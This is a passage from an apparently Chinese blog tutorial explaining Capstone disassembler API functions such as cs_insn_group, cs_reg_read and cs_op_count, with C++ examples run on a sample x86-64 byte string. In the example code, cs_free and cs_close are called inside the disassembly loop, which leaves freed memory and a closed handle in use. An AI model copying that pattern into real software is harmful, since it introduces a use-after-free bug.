class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s"</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"            instruction:  %s"</span>, cs_insn_name(handle, insn-&gt;id));   <span class="comment">//输出该行的操作指令</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出<br><a href="https://i.loli.net/2019/07/27/5d3c250a6507076991.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3c250a6507076991.jpg" class="lazyload"></a></p><h3 id="cs-group-name"><a href="#cs-group-name" class="headerlink" title="cs_group_name"></a>cs_group_name</h3><p><code>const char * CAPSTONE_API cs_group_name(csh handle, unsigned int group_id);</code></p><p>输出指令类型名字<br>指令id可在相关架构的头文件(建立项目时复制到项目文件夹的那些头文件)内找到</p><p>注意： 当处于diet模式时此API不可用，因为引擎不会存储寄存器名</p><p>参数<br>handle: cs_open()返回的句柄<br>insn_id: 指令类型id<br>return: 指令类型的字符名, 如果insn_id不可用返回NULL</p><p>实现代码及示例都与上面类似，略。。</p><h3 id="cs-insn-group"><a href="#cs-insn-group" class="headerlink" title="cs_insn_group"></a>cs_insn_group</h3><p><code>bool CAPSTONE_API cs_insn_group(csh handle, const cs_insn *insn, unsigned int group_id);</code></p><p>检查反汇编后的指令是否属于某个特定指令类型。</p><p>注意：只有当detail选项为ON时这个API可用 (默认OFF).<br>在“diet”模式下，此API没有用，因为引擎不更新insn-&gt;groups数组。</p><p>handle: cs_open()返回的句柄<br>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>group_id: 要检查此指令是否属于的指令类型。<br>return: 如果该指令确实属于给定的指令类型，则为true，否则为false。</p><p>代码实现<br><a href="https://i.loli.net/2019/07/27/5d3c28779993339180.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3c28779993339180.png" class="lazyload"></a></p><p>示例(判断是否属于跳转指令)：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s          "</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"is JUMP:   "</span> &lt;&lt;cs_insn_group(handle, insn, CS_GRP_JUMP) &lt;&lt; <span class="built_in">endl</span>;   <span class="comment">//判断是否为跳转指令</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出<br><a href="https://i.loli.net/2019/07/27/5d3c2cad6a6ee36943.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3c2cad6a6ee36943.jpg" class="lazyload"></a></p><h3 id="cs-reg-read"><a href="#cs-reg-read" class="headerlink" title="cs_reg_read"></a>cs_reg_read</h3><p><code>bool CAPSTONE_API cs_reg_read(csh handle, const cs_insn *insn, unsigned int reg_id);</code></p><p>检查反汇编指令是否隐式使用特定寄存器。</p><p>注意:此API仅在启用detail选项时有效(默认为关闭)<br>在“diet”模式下，此API没有用，因为引擎不更新insn-&gt;regs_read数组。</p><p>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>reg_id: 标注想要检查的这个指令是否使用了它。<br>return: 如果该指令确实隐式使用了给定寄存器，则为true，否则为false。</p><p>代码实现<br><a href="https://i.loli.net/2019/07/27/5d3c2ec62282774188.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3c2ec62282774188.jpg" class="lazyload"></a></p><p>示例同API cs_disasm_iter</p><h3 id="cs-reg-write"><a href="#cs-reg-write" class="headerlink" title="cs_reg_write"></a>cs_reg_write</h3><p><code>bool CAPSTONE_API cs_reg_write(csh handle, const cs_insn *insn, unsigned int reg_id);</code></p><p>检查反汇编指令是否隐式修改了特定寄存器。</p><p>注意:此API仅在启用detail选项时有效(默认为关闭)<br>在“diet”模式下，此API没有用，因为引擎不更新insn-&gt;regs_read数组。</p><p>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>reg_id: 标注想要检查的这个指令是否修改了它。<br>return: 如果该指令确实隐式修改了给定寄存器，则为true，否则为false。</p><p>代码实现<br><a href="https://i.loli.net/2019/07/27/5d3c2f67ee69f50813.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3c2f67ee69f50813.jpg" class="lazyload"></a></p><p>示例同API cs_disasm_iter</p><h3 id="cs-op-count"><a href="#cs-op-count" class="headerlink" title="cs_op_count"></a>cs_op_count</h3><p><code>int CAPSTONE_API cs_op_count(csh handle, const cs_insn *insn, unsigned int op_type);</code></p><p>计算给定类型的操作数的数量。<br>注意：只有当detail选项为ON时这个API可用 (默认OFF).</p><p>handle: cs_open()返回的句柄<br>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>op_type: 要找到的操作数类型。<br>return: 指令insn中给定类型op_type的操作数的数量，返回-1表示查找失败。</p><p>代码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> CAPSTONE_API <span class="title">cs_op_count</span><span class="params">(csh ud, <span class="keyword">const</span> cs_insn *insn, <span class="keyword">unsigned</span> <span class="keyword">int</span> op_type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> count = <span class="number">0</span>, i;</span><br><span class="line"><span class="keyword">if</span> (!ud)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;id) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_SKIPDATA;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (handle-&gt;arch) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">handle-&gt;errnum = CS_ERR_HANDLE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_ARM:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;arm.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;arm.operands[i].type == (arm_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_ARM64:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;arm64.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;arm64.operands[i].type == (arm64_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_X86:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;x86.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;x86.operands[i].type == (x86_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_MIPS:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;mips.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;mips.operands[i].type == (mips_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_PPC:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;ppc.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;ppc.operands[i].type == (ppc_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_SPARC:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;sparc.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;sparc.operands[i].type == (sparc_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_SYSZ:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;sysz.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;sysz.operands[i].type == (sysz_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_XCORE:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;xcore.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;xcore.operands[i].type == (xcore_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_M68K:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;m68k.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;m68k.operands[i].type == (m68k_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_TMS320C64X:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;tms320c64x.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;tms320c64x.operands[i].type == (tms320c64x_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_M680X:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;m680x.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;m680x.operands[i].type == (m680x_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_EVM:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;evm.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;evm.operands[i].type == (evm_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>拿x86指令操作码类型举例</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> x86_op_type &#123;</span><br><span class="line">X86_OP_INVALID = <span class="number">0</span>, <span class="comment">///&lt; = CS_OP_INVALID (未初始化).</span></span><br><span class="line">X86_OP_REG, <span class="comment">///&lt; = CS_OP_REG (寄存操作码).</span></span><br><span class="line">X86_OP_IMM, <span class="comment">///&lt; = CS_OP_IMM (立即操作码).</span></span><br><span class="line">X86_OP_MEM, <span class="comment">///&lt; = CS_OP_MEM (内存操作码).</span></span><br><span class="line">&#125; x86_op_type;</span><br></pre></td></tr></table></figure></div><p>示例(判断寄存操作码)：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s          "</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"is REG:   "</span> &lt;&lt; cs_op_count(handle, insn, X86_OP_REG) &lt;&lt; <span class="built_in">endl</span>;   <span class="comment">//判断是否为寄存操作码</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span 